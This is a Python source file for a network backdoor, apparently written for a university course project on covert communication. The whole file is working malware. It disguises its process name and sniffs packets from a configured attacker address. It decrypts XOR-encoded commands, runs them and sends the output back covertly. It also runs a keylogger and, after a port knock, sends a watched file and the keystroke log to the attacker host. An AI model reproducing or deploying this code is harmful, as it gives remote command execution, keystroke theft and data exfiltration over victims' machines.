#!/usr/bin/python3
# backdoor.py

# COMP 8505 - Project: Covert Communication Application
# Warisha Bilal
# A01022530
# June 19, 2023

"""

The backdoor runs on the server (or victim) host.
The backdoor will:

---- PART 1 ------------------------------------------------------------------------------------
    - accept packets regardless of whether any firewall rules are in place
      once its service port has been opened by a separate application.
    - run as a disguised process
    - only accept authenticated packets
    - extract an encrypted command, decrypt it, and execute it
    - send the results back using a covert channel (UDP or TCP Header?)
    - install a keylogger and send the keystrokes file to the cnc server


---- PART 2 ------------------------------------------------------------------------------------
    - watch for the creation of a specific file in a specific directory
    - automatically send the newly created file to the client (attacker).
    - send the file covertly using a special sequence of validation packets,
      or "knocks".
    - close access to the ports again once the exfil is completed
"""

import os
import sys
import yaml
import time
import subprocess
import setproctitle
from ctypes import *
# import ptrace.debugger
from scapy.all import *
from threading import Thread
from file_monitor import monitor
# from attacker import xor_encrypt_decrypt
from scapy.layers.inet import IP, UDP, TCP
from keylogger import keylogger, write_to_file


# Step 1: mask the process name from anyone looking at the process table.
# Masking a process requires low level programming. Currently using setproctitle
# but if time permits, explore other methods for achieving a proper disguise.
def mask(title):
    try:
        # print(sys.argv[0])
        setproctitle.getproctitle()
        setproctitle.setproctitle(title)

        # debugger = ptrace.debugger.PtraceDebugger()
        # process = debugger.addProcess(pid=os.P_PID, is_attached=False)
        # process.setProcName("BOMBASTIC")
        # time.sleep(100)
        # process.detach()

    except Exception as e:
        print(f"Error: {e}")
        quit()


# Step 2: Raise privileges
def raise_priv():
    uid = 0
    # print(os.getuid())
    # os.setgid(uid)
    os.setuid(uid)


# Step 3: Packet sniffer
# This function checks for an available interface and sniffs packets on it
def capture_packets(attacker_ip, header_key, xor_key, EOL):

    try:

        # conf.verb = 0

        # Get the list of interfaces available
        interfaces = get_if_list()

        # Find the first available network interface
        available_interface = None
        for interface in interfaces:
            # The "eth" option is set for my home network settings. Possibly may need to remove for demo.
            if "lo" not in interface and "vir" not in interface and "eth" not in interface:
                available_interface = interface
                break

        # print("Sniffing packets on: %s" % available_interface)

        if available_interface:

            filter = 'src host {}'.format(attacker_ip)
            # Start sniffing packets
            while True:
                capture = sniff(iface=available_interface,
                                filter=filter,
                                count=1,
                                promisc=True)
                for c in capture:
                    packet_handler(c, attacker_ip, header_key, xor_key, EOL)

        else:
            quit()

    except Exception as e:
        # print(f"Error: {e}")
        quit()


# Step 4: packet handler
# The packet handler function verifies that packets are
# intended for the backdoor and authenticates them.
def packet_handler(capture, attacker_ip, header_key, xor_key, EOL):

    try:

        if UDP in capture:
            sport0 = capture[UDP].sport
            sport = int(sport0 / 256)
            # print(sport)

            # Check if header key is present
            # First, convert the decimal source port to ascii characters
            # NOTE: currently, the header key must only be one byte ascii char
            char = chr(sport)

            # Then, perform a XOR operation to decrypt the data
            char = xor_encrypt_decrypt(xor_key, char)

            # Check if header_key present
            if char == header_key:
                # print(char)

                # If the header key is present, check to see if payload is present.
                if capture[UDP].payload:
                    payload = bytes(capture[UDP].payload).decode('unicode_escape')
                    payload = xor_encrypt_decrypt(xor_key, payload)

                    # Not sure why but decoded data returns payload with
                    # a string of xor_key attached

                    if xor_key or EOL in payload:
                        command = payload.split("[")
                        command = command[-2].split(" ")

                        # Execute the commands
                        output = subprocess.check_output(command, stderr=subprocess.PIPE, text=True)
                        # print(output)

                        # Finally, send the result back to the client host.
                        # Set verbose = False to remove the "Send $ packets." output.
                        # Use sendp instead of send to remove the "Warning Mac address" error. The send
                        # function sends packets on Layer 3. I think in this case, ether packets are
                        # automatically generated (?)
                        output = xor_encrypt_decrypt(xor_key, output)
                        send(IP(dst=attacker_ip) / UDP(sport=sport0, dport=sport0) / output,
                              verbose=False)

        if TCP in capture:
            sport0 = capture[TCP].sport
            sport = int(sport0 / 256)
            char = chr(sport)
            char = xor_encrypt_decrypt(xor_key, char)

            if char == header_key:

                if capture[TCP].payload:
                    payload = bytes(capture[TCP].payload).decode('unicode_escape')
                    payload = xor_encrypt_decrypt(xor_key, payload)

                    if xor_key or EOL in payload:
                        command = payload.split("[")
                        command = command[-2].split(" ")

                        output = subprocess.check_output(command, stderr=subprocess.PIPE, text=True)
                        output = xor_encrypt_decrypt(xor_key, output)
                        send(IP(dst=attacker_ip) / TCP(sport=sport0, dport=sport0) / output,
                             verbose=False)

    except Exception as e:
        # print(f"Error: {e}")
        capture_packets(attacker_ip, header_key, xor_key, EOL)


# This function is used to encrypt both the header key and commands
def xor_encrypt_decrypt(xor_key, data):

    try:
        for i in range(len(data)):
            data = (data[:i] +
                    chr(ord(data[i]) ^ ord(xor_key)) +
                    data[i+1:])
            # print(data[i], end="")
        return data

    except Exception as e:
        print(f"Error: {e}")
        quit()


def port_knock(port_list, attacker_ip):

    send(IP(dst=attacker_ip) / TCP(sport=port_list[0], dport=port_list[0]), verbose=False)
    time.sleep(0.5)
    send(IP(dst=attacker_ip) / TCP(sport=port_list[1], dport=port_list[1]), verbose=False)
    time.sleep(0.5)
    send(IP(dst=attacker_ip) / TCP(sport=port_list[2], dport=port_list[2]), verbose=False)
    time.sleep(0.5)


class SniffThread(Thread):

    def __init__(self, threadID, name, delay, attacker_ip, header_key, xor_key, EOL):
        Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.delay = delay
        self.attacker_ip = attacker_ip
        self.header_key = header_key
        self.xor_key = xor_key
        self.EOL = EOL

    def run(self):

        attacker_ip = self.attacker_ip
        header_key = self.header_key
        xor_key = self.xor_key
        EOL = self.EOL
        capture_packets(attacker_ip, header_key, xor_key, EOL)


class KeyloggerThread(Thread):
    def __init__(self, threadID, name, delay, kbd_file, keylog_file):
        Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.delay = delay
        self.kbd_file = kbd_file
        self.keylog_file = keylog_file

    def run(self):

        kbd_file = self.kbd_file
        keylog_file = self.keylog_file
        keylogger(keylog_file, kbd_file)


class MonitorThread(Thread):
    def __init__(self, threadID, name, delay, attacker_ip, open_port, port_list, monitor_file, keylog_file, EOL):
        Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.delay = delay
        self.attacker_ip = attacker_ip
        self.open_port = open_port
        self.port_list = port_list
        self.monitor_file = monitor_file
        self.keylog_file = keylog_file
        self.EOL = EOL

    def run(self):

        attacker_ip = self.attacker_ip
        open_port = self.open_port
        port_list = self.port_list
        monitor_file = self.monitor_file
        keylog_file = self.keylog_file
        EOL = self.EOL

        while True:
            file = monitor()
            if file:
                (_, type_names, path, filename) = file

                if filename == monitor_file:

                    port_knock(port_list, attacker_ip)
                    full_path = os.path.join(path,filename)

                    # Send monitored file contents
                    with open(full_path, 'r') as f:
                        file_contents = f.readline()
                        f.close()
                    #
                    # print(file_contents)
                    file_contents = filename + file_contents + EOL
                    file_contents = xor_encrypt_decrypt('P', file_contents)
                    # print(file_contents)
                    send(IP(dst=attacker_ip) / TCP(sport=open_port, dport=open_port) / file_contents)

                    # Send keylogger file contents
                    with open(keylog_file, 'r') as f:
                        file_contents = f.readline()
                        f.close()

                    # print(file_contents)
                    file_contents = keylog_file + file_contents + EOL
                    file_contents = xor_encrypt_decrypt('P', file_contents)
                    # print(file_contents)
                    send(IP(dst=attacker_ip) / TCP(sport=open_port, dport=open_port) / file_contents)


def main():

    try:

        # Reads the config file
        with open('config.yml', 'r') as config:
            config_file = yaml.safe_load(config.read())

            # Backdoor and client network
            attacker_iface = config_file['attacker_iface']
            attacker_ip = config_file['attacker_ip']
            victim_ip = config_file['victim_ip']
            protocol = config_file['protocol']

            # Encryption variables
            header_key = config_file['header_key']
            xor_key = config_file['xor_key']
            EOL = config_file['EOL']

            port_list = config_file['port_list']
            open_port = config_file['open_port']
            monitor_file = config_file['monitor_file']
            kbd_file = config_file['kbd_file']
            keylog_file = config_file['keylog_file']
            command_output = config_file['command_output']
            timer = config_file['timer']
            psmask = config_file['psmask']

            config.close()

        # Parse command line arguments
        # parse()

        # Mask the process
        mask(psmask)

        # Raise privileges
        # raise_priv()

        # Capture packets
        # Create a SniffThread object that sniffs for udp packets
        # Checks for key to authenticate, and then executes and sends
        # Commands back to the client.
        t1 = SniffThread(1, 'Sniff', 0, attacker_ip, header_key, xor_key, EOL)

        # Daemonize the thread so it runs in the background
        t1.daemon = True

        # Start the thread
        t1.start()

        # Waits to complete thread before starting another
        # t1.join()

        t2 = KeyloggerThread(2, 'keylogger', 0, kbd_file, keylog_file)
        t2.daemon = True
        t2.start()
        # t2.join()

        t3 = MonitorThread(3, 'monitor', 0, attacker_ip, open_port, port_list, monitor_file, keylog_file, EOL)
        # t3.daemon = True
        t3.start()
        # t3.join()

    except Exception as e:
        print(f"Error: {e}")
        quit()


if __name__ == "__main__":
    main()
